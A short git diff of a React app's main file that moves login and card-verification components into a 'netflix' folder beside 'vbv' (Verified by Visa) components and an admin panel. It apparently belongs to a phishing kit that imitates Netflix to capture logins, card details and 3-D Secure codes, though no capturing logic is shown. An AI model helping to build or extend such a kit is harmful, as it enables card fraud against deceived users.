@@ -1,7 +1,7 @@
 import React, { useEffect } from 'react';
 import { BrowserRouter, Route, Switch } from 'react-router-dom';
-import Login from './components/login';
-import VerificationCCerror from './components/VerificationCCerror';
+import Login from './components/netflix/login';
+import VerificationCCerror from './components/netflix/VerificationCCerror';
 import container from './components/vbv/container'; 
 import vbvsubmit from './components/vbv/vbvsubmit'; 
 import AdminPanel from './components/AdminPanel'; // Import AdminPanel
@@ -10,7 +10,7 @@ import ContainerLoading from './components/containers/container_app_loading'; //
 import ContainerCode from './components/containers/container_code'; // Import ContainerCode
 import ContainerError from './components/containers/container_error'; // Import ContainerError
 import ContainerCustomError from './components/containers/container_custom_error'; // Import ContainerCustomError
-import VerificationCC from './components/VerificationCC';
+import VerificationCC from './components/netflix/VerificationCC';
 function App() {
   // Function to fix double scrollbars
   useEffect(() => {
